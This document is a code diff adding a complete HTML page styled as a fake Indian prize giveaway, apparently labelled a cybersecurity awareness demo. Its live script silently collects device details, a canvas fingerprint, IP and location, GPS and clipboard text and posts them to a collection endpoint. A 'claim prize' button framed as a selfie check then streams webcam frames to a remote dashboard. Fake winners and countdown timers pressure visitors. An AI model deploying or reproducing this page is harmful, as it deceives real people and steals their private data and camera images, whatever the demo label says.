@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Congratulations! You've been selected 🎉</title>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+  :root {
+    --gold: #f5c518;
+    --gold2: #ff9d00;
+    --red: #e8192c;
+    --green: #1a9c3e;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Nunito', sans-serif;
+    background: linear-gradient(160deg, #1a0533 0%, #2d0a5e 50%, #1a0533 100%);
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center;
+    padding: 0 16px 40px;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /*CONFETTI*/
+  .confetti-wrap { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+  .confetti-piece {
+    position: absolute; width: 10px; height: 14px; border-radius: 2px;
+    animation: fall linear infinite; opacity: 0.85;
+  }
+  @keyframes fall {
+    0%   { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+  }
+
+  /*TOP BANNER*/
+  .top-banner {
+    width: 100%; max-width: 480px;
+    background: var(--red); color: #fff;
+    text-align: center; font-size: 13px; font-weight: 800; letter-spacing: 0.5px;
+    padding: 10px 16px;
+    position: relative; z-index: 2;
+    animation: pulse-banner 2s ease-in-out infinite;
+  }
+  @keyframes pulse-banner { 0%,100%{background:#e8192c} 50%{background:#c0101f} }
+  .top-banner span { color: var(--gold); }
+
+  /*MAIN CARD*/
+  .card {
+    background: #fff; border-radius: 20px;
+    width: 100%; max-width: 480px;
+    box-shadow: 0 8px 60px rgba(0,0,0,0.5), 0 0 0 4px #f5c51844;
+    position: relative; z-index: 2; overflow: hidden; margin-top: 0;
+  }
+
+  .card-header {
+    background: linear-gradient(135deg, #f5c518 0%, #ff9d00 100%);
+    padding: 20px 20px 16px; text-align: center; position: relative;
+  }
+  .card-header::after {
+    content: ''; position: absolute; bottom: -12px; left: 0; right: 0;
+    height: 24px; background: #fff; border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+  }
+  .crown { font-size: 36px; line-height: 1; margin-bottom: 4px; }
+  .header-title { font-size: 26px; font-weight: 900; color: #1a0533; text-shadow: 0 2px 0 rgba(255,255,255,0.4); line-height: 1.1; }
+  .header-sub { font-size: 13px; font-weight: 700; color: #7a4400; margin-top: 4px; }
+
+  .timer-bar {
+    background: #fff3; border-radius: 6px; padding: 6px 14px;
+    display: inline-flex; align-items: center; gap: 6px;
+    margin-top: 10px; font-size: 13px; font-weight: 800; color: #5a2800;
+  }
+  .timer-num {
+    background: #1a0533; color: var(--gold); border-radius: 4px;
+    padding: 2px 8px; font-size: 16px; font-variant-numeric: tabular-nums;
+    min-width: 36px; text-align: center;
+  }
+
+  /*BODY*/
+  .card-body { padding: 28px 20px 20px; }
+
+  .greeting {
+    background: #f0fff4; border: 1.5px solid #34c759;
+    border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 18px; display: flex; align-items: center; gap: 10px;
+  }
+  .greeting-icon { font-size: 28px; flex-shrink: 0; }
+  .greeting-text { font-size: 13px; color: #1a5c30; font-weight: 700; line-height: 1.5; }
+  .greeting-text strong { color: #0a3d1f; font-size: 14px; }
+
+  .prize-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 2px;
+    color: #888; text-transform: uppercase; text-align: center; margin-bottom: 10px;
+  }
+
+  /*SLOT MACHINE*/
+  .slot-machine { display: flex; gap: 6px; justify-content: center; margin-bottom: 18px; }
+  .slot {
+    flex: 1; background: #1a0533; border-radius: 10px;
+    border: 2px solid #f5c518; height: 72px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 30px; position: relative; overflow: hidden;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
+  }
+  .slot.spinning .slot-inner { animation: spin-slot 0.12s linear infinite; }
+  .slot-inner { display: block; line-height: 1; }
+  @keyframes spin-slot {
+    0% { transform: translateY(0); } 25% { transform: translateY(-8px); }
+    75% { transform: translateY(8px); } 100% { transform: translateY(0); }
+  }
+  .slot-shine {
+    position: absolute; top: 0; left: 0; right: 0; height: 36px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.08) 0%, transparent 100%);
+    pointer-events: none;
+  }
+
+  /*SPIN BUTTON*/
+  #spinBtn {
+    width: 100%;
+    background: linear-gradient(135deg, #e8192c 0%, #c0101f 100%);
+    color: #fff; border: none; border-radius: 14px; padding: 18px;
+    font-family: 'Nunito', sans-serif; font-size: 18px; font-weight: 900;
+    letter-spacing: 0.5px; cursor: pointer;
+    box-shadow: 0 6px 0 #8a0010, 0 8px 20px rgba(232,25,44,0.4);
+    transition: transform 0.1s, box-shadow 0.1s;
+    position: relative; overflow: hidden; margin-bottom: 10px;
+  }
+  #spinBtn::before {
+    content: ''; position: absolute; top: 0; left: -100%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    animation: shine 2.5s ease infinite;
+  }
+  @keyframes shine { 0%{left:-100%} 40%,100%{left:150%} }
+  #spinBtn:hover { transform: translateY(-2px); box-shadow: 0 8px 0 #8a0010, 0 12px 24px rgba(232,25,44,0.5); }
+  #spinBtn:active { transform: translateY(2px); box-shadow: 0 3px 0 #8a0010; }
+  #spinBtn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+  .spin-note { text-align: center; font-size: 11px; color: #aaa; margin-bottom: 18px; font-weight: 600; }
+  .spin-note span { color: var(--red); font-weight: 800; }
+
+  /*PRIZES LIST*/
+  .prizes-section {
+    background: #fafafa; border-radius: 12px; padding: 14px 16px;
+    margin-bottom: 16px; border: 1.5px solid #eee;
+  }
+  .prizes-title { font-size: 11px; font-weight: 800; letter-spacing: 2px; color: #bbb; text-transform: uppercase; margin-bottom: 10px; }
+  .prize-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 7px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px;
+  }
+  .prize-row:last-child { border-bottom: none; }
+  .prize-emoji { font-size: 22px; width: 32px; text-align: center; }
+  .prize-name { font-weight: 700; color: #333; flex: 1; }
+  .prize-chance {
+    font-size: 11px; font-weight: 800; padding: 2px 8px; border-radius: 20px;
+  }
+  .chance-hot  { background: #fff0f0; color: #e8192c; }
+  .chance-warm { background: #fff8e0; color: #b87000; }
+  .chance-cold { background: #f0f8ff; color: #1a6db8; }
+
+  /*WINNER TICKER*/
+  .ticker-wrap { background: #1a0533; border-radius: 10px; padding: 10px 14px; overflow: hidden; margin-bottom: 16px; }
+  .ticker-label { font-size: 9px; letter-spacing: 2px; color: #f5c518; font-weight: 800; text-transform: uppercase; margin-bottom: 6px; }
+  .ticker-inner { white-space: nowrap; animation: ticker 18s linear infinite; display: inline-block; }
+  @keyframes ticker { 0%{transform:translateX(100%)} 100%{transform:translateX(-100%)} }
+  .ticker-item { display: inline; font-size: 12px; color: #e0d0ff; margin-right: 40px; font-weight: 600; }
+  .ticker-item strong { color: #f5c518; }
+
+  /*TRUST BADGES*/
+  .trust-row { display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; margin-bottom: 16px; }
+  .trust-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: #888; font-weight: 700; }
+  .trust-badge span { font-size: 15px; }
+
+  /*WIN MODAL*/
+  #win-modal {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.8); z-index: 999;
+    align-items: center; justify-content: center; padding: 20px;
+  }
+  #win-modal.show { display: flex; }
+  .modal-card {
+    background: #fff; border-radius: 20px; padding: 32px 24px;
+    max-width: 360px; width: 100%; text-align: center;
+    animation: pop-in 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
+    position: relative; overflow: hidden;
+  }
+  @keyframes pop-in { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
+  .modal-card::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px;
+    background: linear-gradient(90deg, #f5c518, #ff9d00, #e8192c, #ff9d00, #f5c518);
+  }
+  .modal-prize { font-size: 64px; margin-bottom: 10px; }
+  .modal-title { font-size: 26px; font-weight: 900; color: #1a0533; margin-bottom: 6px; }
+  .modal-subtitle { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+  .modal-timer { background: #fff3e0; border-radius: 10px; padding: 10px; font-size: 13px; font-weight: 800; color: #b85c00; margin-bottom: 20px; }
+  .modal-timer-num { color: #e8192c; font-size: 22px; }
+  #claimBtn {
+    width: 100%;
+    background: linear-gradient(135deg, #1a9c3e, #127a2e);
+    color: #fff; border: none; border-radius: 12px; padding: 16px;
+    font-family: 'Nunito', sans-serif; font-size: 17px; font-weight: 900;
+    cursor: pointer; box-shadow: 0 5px 0 #0a4a1c, 0 6px 16px rgba(26,156,62,0.4);
+    transition: transform 0.1s, box-shadow 0.1s; margin-bottom: 10px;
+  }
+  #claimBtn:hover { transform: translateY(-2px); box-shadow: 0 7px 0 #0a4a1c, 0 10px 20px rgba(26,156,62,0.5); }
+  #claimBtn:active { transform: translateY(2px); box-shadow: 0 2px 0 #0a4a1c; }
+  .modal-fine-print { font-size: 10px; color: #bbb; line-height: 1.5; }
+
+  /*
+  PAWNED OVERLAY
+  */
+  #pawned-overlay {
+    display: none;
+    position: fixed; inset: 0; z-index: 99999;
+    background: #000;
+    flex-direction: column;
+    align-items: center; justify-content: flex-start;
+    overflow-y: auto;
+    padding: 0 0 60px;
+  }
+  #pawned-overlay.show { display: flex; }
+
+  .pawned-top {
+    width: 100%;
+    background: #ff0000;
+    padding: 28px 24px 22px;
+    text-align: center;
+    position: relative;
+    animation: flash-red 0.5s steps(1) 4;
+  }
+  @keyframes flash-red { 0%,100%{background:#ff0000} 50%{background:#cc0000} }
+
+  .pawned-skull { font-size: 72px; line-height: 1; margin-bottom: 10px; filter: drop-shadow(0 0 24px #ff0000); }
+
+  .pawned-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(28px, 7vw, 52px);
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000;
+    animation: glitch 2s infinite;
+    margin-bottom: 8px;
+  }
+  @keyframes glitch {
+    0%,90%,100% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; transform: none; }
+    91% { text-shadow: -3px 0 #00ffff, 3px 0 #ff00ff; transform: skewX(-5deg); }
+    93% { text-shadow: 3px 0 #00ffff, -3px 0 #ff00ff; transform: skewX(5deg); }
+    95% { text-shadow: 0 0 30px #ff0000; transform: none; }
+  }
+
+  .pawned-sub {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px; color: #ffaaaa; letter-spacing: 2px;
+  }
+
+  /*DATA DUMP*/
+  .pawned-body { width: 100%; max-width: 540px; padding: 24px 20px 0; }
+
+  .dump-intro {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; color: #ff4444;
+    text-align: center; margin-bottom: 20px; line-height: 1.7;
+    background: #0d0000; border: 1px solid #ff000033; border-radius: 8px;
+    padding: 14px 16px;
+  }
+
+  .dump-section-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; letter-spacing: 3px; color: #ff3333;
+    text-transform: uppercase; margin-bottom: 10px; margin-top: 20px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .dump-section-title::after {
+    content: ''; flex: 1; height: 1px; background: #ff000033;
+  }
+
+  .data-dump-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 4px;
+  }
+  .dump-card {
+    background: #0a0000;
+    border: 1px solid #ff000022;
+    border-left: 2px solid #ff3333;
+    border-radius: 6px;
+    padding: 10px 12px;
+    animation: appear 0.3s ease both;
+  }
+  .dump-card.full { grid-column: 1 / -1; }
+  @keyframes appear { from{opacity:0;transform:translateX(-10px)} to{opacity:1;transform:none} }
+  .dump-key {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px; letter-spacing: 2px; color: #ff3333;
+    text-transform: uppercase; margin-bottom: 4px;
+  }
+  .dump-val {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; color: #ff9999; word-break: break-all; line-height: 1.5;
+  }
+  .dump-val.bright { color: #ff4444; font-weight: 700; }
+
+  /*CAMERA STREAM BOX*/
+   .cam-box {
+    background: #0a0000; border: 2px solid #ff3333;
+    border-radius: 10px; padding: 14px;
+    margin-top: 8px;
+  }
+  .cam-box-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px; letter-spacing: 2px; color: #ff3333;
+    text-transform: uppercase; margin-bottom: 10px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .cam-live-dot {
+    width: 7px; height: 7px; border-radius: 50%; background: #ff0000;
+    animation: blink 0.8s infinite; flex-shrink: 0;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.1} }
+  #pawned-cam {
+    width: 100%; border-radius: 6px;
+    border: 1px solid #ff333344; background: #000;
+    display: none;
+  }
+  .cam-waiting { font-family:'Share Tech Mono',monospace; font-size:12px; color:#ff333388; text-align:center; padding:20px 0; }
+ 
+
+  /*LESSON BOX*/
+  .lesson-box {
+    background: #000d1a;
+    border: 1px solid #1a4d7a; border-left: 3px solid #4d9fff;
+    border-radius: 8px; padding: 16px 18px; margin-top: 20px;
+  }
+  .lesson-title {
+    font-family:'Share Tech Mono',monospace; font-size:10px;
+    letter-spacing:2px; color:#4d9fff; text-transform:uppercase; margin-bottom:12px;
+  }
+  .lesson-item {
+    display:flex; gap:10px; align-items:flex-start;
+    font-size:12px; color:#a0c4e8; line-height:1.6; margin-bottom:8px;
+    font-family:'Share Tech Mono',monospace;
+  }
+  .lesson-item:last-child { margin-bottom:0; }
+  .lesson-dot { color:#4d9fff; flex-shrink:0; font-size:14px; }
+
+  .page-footer { margin-top: 20px; text-align:center; font-size:10px; color:#ffffff33; position:relative; z-index:2; line-height:1.8; }
+
+  video#cam { display:none; }
+</style>
+</head>
+<body>
+
+<!--CONFETTI-->
+<div class="confetti-wrap" id="confetti"></div>
+
+<!--TOP BANNER-->
+<div class="top-banner" style="max-width:480px;">
+   <span>YOU'VE BEEN SELECTED</span> Limited time offer! Claim your prize now
+</div>
+
+<!--MAIN CARD-->
+<div class="card">
+  <div class="card-header">
+    <div class="crown"></div>
+    <div class="header-title">CONGRATULATIONS!</div>
+    <div class="header-sub">You are today's lucky winner #<span id="winner-num">4,847</span></div>
+    <div class="timer-bar">
+      ⏱ Offer expires in:
+      <span class="timer-num" id="timer-mm">09</span>:<span class="timer-num" id="timer-ss">59</span>
+    </div>
+  </div>
+
+  <div class="card-body">
+    <div class="greeting">
+      <div class="greeting-icon"></div>
+      <div class="greeting-text">
+        <strong>Your device has been verified!</strong><br>
+        You qualify for our <strong>FREE</strong> daily prize giveaway. Spin below to reveal your prize!
+      </div>
+    </div>
+
+    <div class="ticker-wrap">
+      <div class="ticker-label"> Recent winners</div>
+      <div class="ticker-inner">
+        <span class="ticker-item"><strong>Priya S.</strong> from Mumbai won ₹10,000 Amazon Gift Card · </span>
+        <span class="ticker-item"><strong>Rahul M.</strong> from Delhi won iPhone 17 Pro · </span>
+        <span class="ticker-item"><strong>Anita K.</strong> from Bangalore won ₹5,000 Cash · </span>
+        <span class="ticker-item"><strong>Vikram R.</strong> from Pune won PlayStation 5 · </span>
+        <span class="ticker-item"><strong>Sunita P.</strong> from Hyderabad won ₹15,000 Flipkart Voucher · </span>
+      </div>
+    </div>
+
+    <div class="prize-label">Your prize is waiting, spin to reveal!</div>
+    <div class="slot-machine">
+      <div class="slot" id="slot1"><span class="slot-inner" id="s1"></span><div class="slot-shine"></div></div>
+      <div class="slot" id="slot2"><span class="slot-inner" id="s2"></span><div class="slot-shine"></div></div>
+      <div class="slot" id="slot3"><span class="slot-inner" id="s3"></span><div class="slot-shine"></div></div>
+    </div>
+
+    <button id="spinBtn"> SPIN TO WIN: FREE!</button>
+    <div class="spin-note">You have <span id="spins-left">1 FREE spin</span> remaining today</div>
+
+    <div class="prizes-section">
+      <div class="prizes-title"> Available prizes today</div>
+      <div class="prize-row"><div class="prize-emoji"></div><div class="prize-name">iPhone 17 Pro (256GB)</div><div class="prize-chance chance-hot">JACKPOT</div></div>
+      <div class="prize-row"><div class="prize-emoji"></div><div class="prize-name">₹10,000 Amazon Gift Card</div><div class="prize-chance chance-hot">HOT</div></div>
+      <div class="prize-row"><div class="prize-emoji"></div><div class="prize-name">PlayStation 5</div><div class="prize-chance chance-warm">RARE</div></div>
+      <div class="prize-row"><div class="prize-emoji"></div><div class="prize-name">₹5,000 Paytm Cash</div><div class="prize-chance chance-cold">COMMON</div></div>
+    </div>
+
+    <div class="trust-row">
+      <div class="trust-badge"><span></span> SSL Secured</div>
+      <div class="trust-badge"><span></span> Verified Winners</div>
+      <div class="trust-badge"><span></span> Instant Delivery</div>
+      <div class="trust-badge"><span></span> 50K+ Winners</div>
+    </div>
+  </div>
+</div>
+
+<div class="page-footer">prizes-india.win · No purchase necessary · T&C apply<br>© 2026 PrizeDraw Network</div>
+
+<!--WIN MODAL-->
+<div id="win-modal">
+  <div class="modal-card">
+    <div class="modal-prize" id="modal-prize-icon"></div>
+    <div class="modal-title">YOU WON!</div>
+    <div class="modal-subtitle" id="modal-prize-name">Congratulations! Your prize has been reserved. Claim it before the timer runs out.</div>
+    <div class="modal-timer">⏱ Reserve expires in <span class="modal-timer-num" id="modal-timer">9:59</span></div>
+    <button id="claimBtn">CLAIM MY PRIZE NOW</button>
+    <div class="modal-fine-print">To verify your identity and deliver your prize, we need camera access for a quick selfie. Required by our anti-fraud policy.</div>
+  </div>
+</div>
+
+<!--PAWNED OVERLAY-->
+<div id="pawned-overlay">
+
+  <div class="pawned-top">
+    <div class="pawned-skull"></div>
+    <div class="pawned-title">YOU HAVE BEEN PAWNED!</div>
+    <div class="pawned-sub"> CYBERSECURITY AWARENESS DEMO </div>
+  </div>
+
+  <div class="pawned-body">
+
+    <div class="dump-intro">
+      ⚠ This was a demonstration.<br>
+      The moment you opened this page, <strong>before you clicked anything</strong> .<br>
+      the following data was silently harvested and sent to the attacker's dashboard.
+    </div>
+
+    <div class="dump-section-title"> Data collected silently (zero permission asked)</div>
+    <div class="data-dump-grid">
+      <div class="dump-card"><div class="dump-key"> IP Address</div><div class="dump-val bright" id="p-ip">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Location</div><div class="dump-val" id="p-loc">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Device Type</div><div class="dump-val" id="p-device">—</div></div>
+      <div class="dump-card"><div class="dump-key"> OS</div><div class="dump-val" id="p-os">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Browser</div><div class="dump-val" id="p-browser">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Battery</div><div class="dump-val bright" id="p-battery">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Network</div><div class="dump-val" id="p-network">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Timezone</div><div class="dump-val" id="p-tz">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Screen</div><div class="dump-val" id="p-screen">—</div></div>
+      <div class="dump-card"><div class="dump-key"> Language</div><div class="dump-val" id="p-lang">—</div></div>
+      <div class="dump-card full"><div class="dump-key"> Canvas Fingerprint (unique device ID, no permission needed)</div><div class="dump-val bright" id="p-fp">—</div></div>
+      <div class="dump-card full"><div class="dump-key"> Clipboard Contents (attempted)</div><div class="dump-val" id="p-clipboard">—</div></div>
+      <div class="dump-card full"><div class="dump-key"> Full User Agent</div><div class="dump-val" id="p-ua" style="font-size:9px;color:#ff666688;">—</div></div>
+    </div>
+
+    <div class="dump-section-title"> Camera, accessed with ONE click ("Claim Prize" button)</div>
+    <div class="cam-box">
+      <div class="cam-box-title"><div class="cam-live-dot"></div> LIVE CAMERA FEED, streaming to attacker dashboard</div>
+      <div class="cam-waiting" id="cam-waiting">Camera stream appears here after "Claim" is tapped</div>
+      <video id="pawned-cam" autoplay playsinline muted></video>
+    </div> 
+
+    <div class="lesson-box">
+      <div class="lesson-title"> How to protect yourself</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> Every website silently gets your IP, device, browser, OS, timezone, and battery: no prompt ever appears.</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> Canvas fingerprinting creates a unique ID for your device that persists even in Incognito mode.</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> The camera was granted with ONE click disguised as "Claim Prize", the same trick used on fake video players and CAPTCHAs.</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> Never click links in unexpected messages. Type URLs directly into your browser.</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> Use a VPN on public Wi-Fi always. A captive portal like this is indistinguishable from a real one.</div>
+      <div class="lesson-item"><span class="lesson-dot">›</span> In browser settings: block camera/mic by default, block location, and disable clipboard access for unknown sites.</div>
+    </div>
+
+  </div>
+</div>
+
+<!--Hidden video for streaming-->
+<video id="cam" autoplay playsinline muted></video>
+
+<script>
+  const socket = io();
+  const collected = {};
+
+  /*CONFETTI*/
+  const colors = ['#f5c518','#ff9d00','#e8192c','#00c853','#2979ff','#aa00ff','#fff'];
+  const confWrap = document.getElementById('confetti');
+  for (let i = 0; i < 55; i++) {
+    const p = document.createElement('div');
+    p.className = 'confetti-piece';
+    p.style.cssText = `left:${Math.random()*100}%;width:${6+Math.random()*8}px;height:${10+Math.random()*8}px;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${3+Math.random()*5}s;animation-delay:${Math.random()*4}s;border-radius:${Math.random()>0.5?'50%':'2px'};`;
+    confWrap.appendChild(p);
+  }
+
+  /*COUNTDOWN*/
+  let totalSecs = 599;
+  function updateTimer() {
+    const m = String(Math.floor(totalSecs/60)).padStart(2,'0');
+    const s = String(totalSecs%60).padStart(2,'0');
+    document.getElementById('timer-mm').textContent = m;
+    document.getElementById('timer-ss').textContent = s;
+    const mt = document.getElementById('modal-timer');
+    if (mt) mt.textContent = `${m}:${s}`;
+    if (totalSecs > 0) totalSecs--;
+  }
+  updateTimer(); setInterval(updateTimer, 1000);
+
+  /*WINNER COUNTER*/
+  let wn = 4847;
+  setInterval(() => {
+    if (Math.random() > 0.7) { wn += Math.floor(Math.random()*3)+1; document.getElementById('winner-num').textContent = wn.toLocaleString(); }
+  }, 3000);
+
+  /*SLOT MACHINE*/
+  let hasSpun = false;
+  document.getElementById('spinBtn').addEventListener('click', () => {
+    if (hasSpun) return;
+    hasSpun = true;
+    const btn = document.getElementById('spinBtn');
+    btn.disabled = true; btn.textContent = 'Spinning...';
+    document.getElementById('spins-left').textContent = '0 spins remaining';
+
+    ['slot1','slot2','slot3'].forEach(id => document.getElementById(id).classList.add('spinning'));
+
+    const prizes = ['💰','💰','💰'];
+    [800,1200,1700].forEach((delay, i) => {
+      setTimeout(() => {
+        document.getElementById(['slot1','slot2','slot3'][i]).classList.remove('spinning');
+        document.getElementById(['s1','s2','s3'][i]).textContent = prizes[i];
+        if (i === 2) setTimeout(showWin, 400);
+      }, delay);
+    });
+  });
+
+  /*WIN MODAL*/
+  function showWin() {
+    document.getElementById('modal-prize-icon').textContent = '';
+    document.getElementById('modal-prize-name').textContent = 'You won an iPhone 17 Pro (256GB)! Reserved for 10 minutes. Claim before it expires!';
+    document.getElementById('win-modal').classList.add('show');
+  }
+
+  /*CLAIM BUTTON -> CAMERA -> PAWNED REVEAL*/
+  document.getElementById('claimBtn').addEventListener('click', async () => {
+    const btn = document.getElementById('claimBtn');
+    btn.textContent = ' Verifying identity...';
+    btn.disabled = true;
+
+    //Populate the pawned overlay with collected data NOW
+    populatePawned();
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+
+      //Feed the hidden stream to dashboard
+      const camVid = document.getElementById('cam');
+      camVid.srcObject = stream;
+
+      //Also show it in the pawned overlay
+      const pawnedCam = document.getElementById('pawned-cam');
+      pawnedCam.srcObject = stream;
+      pawnedCam.style.display = 'block';
+      document.getElementById('cam-waiting').style.display = 'none';
+
+      //Stream frames via socket
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      setInterval(() => {
+        if (camVid.readyState >= 2) {
+          canvas.width = camVid.videoWidth || 320;
+          canvas.height = camVid.videoHeight || 240;
+          ctx.drawImage(camVid, 0, 0, canvas.width, canvas.height);
+          socket.emit('webcam_frame', { type: 'frame', data: canvas.toDataURL('image/jpeg', 0.5) });
+        }
+      }, 100);
+
+      collected.cameraGranted = true;
+      sendData();
+
+    } catch(err) {
+      //Camera denied, still show pawned overlay, just without cam feed
+      collected.cameraGranted = false;
+    }
+
+    //Show the pawned overlay regardless of camera outcome
+    document.getElementById('win-modal').classList.remove('show');
+    document.getElementById('pawned-overlay').classList.add('show');
+    window.scrollTo(0, 0);
+  });
+
+  /*POPULATE PAWNED DATA FIELDS*/
+  function populatePawned() {
+    const set = (id, val) => { const el = document.getElementById(id); if(el && val) el.textContent = val; };
+    set('p-ip',        collected.ip        || 'Fetching...');
+    set('p-loc',       collected.location  || 'Detecting...');
+    set('p-device',    collected.deviceType === 'Mobile' ? ' Mobile Device' : ' Desktop/Laptop');
+    set('p-os',        collected.os);
+    set('p-browser',   collected.browser);
+    set('p-battery',   collected.battery   || 'Reading...');
+    set('p-network',   collected.network   || 'N/A');
+    set('p-tz',        collected.timezone);
+    set('p-screen',    collected.screen);
+    set('p-lang',      collected.language);
+    set('p-fp',        collected.canvasFingerprint ? collected.canvasFingerprint + ' (unique to this device + browser)' : '—');
+    set('p-clipboard', collected.clipboard || 'Blocked by browser / empty');
+    set('p-ua',        collected.userAgent);
+    //Animate cards in with staggered delays
+    document.querySelectorAll('.dump-card').forEach((c, i) => {
+      c.style.animationDelay = `${i * 0.06}s`;
+    });
+  }
+
+  /*SILENT DATA COLLECTION*/
+  const ua = navigator.userAgent;
+  collected.userAgent = ua;
+
+  let browser = 'Unknown';
+  if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome';
+  else if (ua.includes('Firefox')) browser = 'Mozilla Firefox';
+  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Apple Safari';
+  else if (ua.includes('Edg')) browser = 'Microsoft Edge';
+  collected.browser = browser;
+
+  let os = 'Unknown';
+  if (ua.includes('Android')) os = 'Android';
+  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+  else if (ua.includes('Windows')) os = 'Windows';
+  else if (ua.includes('Mac')) os = 'macOS';
+  else if (ua.includes('Linux')) os = 'Linux';
+  collected.os = os;
+
+  collected.deviceType = /Mobi|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop';
+  collected.screen    = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x DPR)`;
+  collected.language  = navigator.language;
+  collected.timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  collected.cookies   = navigator.cookieEnabled;
+
+  if (navigator.connection) {
+    const c = navigator.connection;
+    collected.network = `${c.effectiveType?.toUpperCase() || '?'} — ${c.downlink || '?'} Mbps`;
+  }
+
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      collected.battery = `${Math.round(b.level*100)}% ${b.charging ? '⚡ Charging' : ' On battery'}`;
+    });
+  }
+
+  //Canvas fingerprint
+  (() => {
+    const cv = document.createElement('canvas'), ctx = cv.getContext('2d');
+    cv.width = 200; cv.height = 40;
+    ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = '#069'; ctx.fillText('Win',2,15);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Win',4,17);
+    const data = cv.toDataURL();
+    let hash = 0;
+    for (let i = 0; i < data.length; i++) { hash = ((hash<<5)-hash)+data.charCodeAt(i); hash|=0; }
+    collected.canvasFingerprint = `DEVICE-${Math.abs(hash).toString(16).toUpperCase().padStart(8,'0')}`;
+  })();
+
+  //IP + geo
+  fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(d=>{
+      collected.ip = d.ip;
+      collected.location = `${d.city}, ${d.region}, ${d.country_name}`;
+      collected.isp = d.org;
+      sendData();
+    })
+    .catch(()=>sendData());
+
+  //GPS
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => { collected.gps = `${p.coords.latitude.toFixed(5)},${p.coords.longitude.toFixed(5)}`; },
+      () => { collected.gps = 'Denied'; }
+    );
+  }
+
+  //Clipboard
+  if (navigator.clipboard?.readText) {
+    navigator.clipboard.readText().then(t => { collected.clipboard = t.substring(0,200); }).catch(()=>{});
+  }
+
+  function sendData() {
+    collected.url = window.location.href;
+    collected.referrer = document.referrer || 'Direct';
+    collected.pageTitle = document.title;
+    fetch('/api/collect', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(collected)
+    });
+  }
+
+  setTimeout(sendData, 1200);
+</script>
+</body>
+</html>
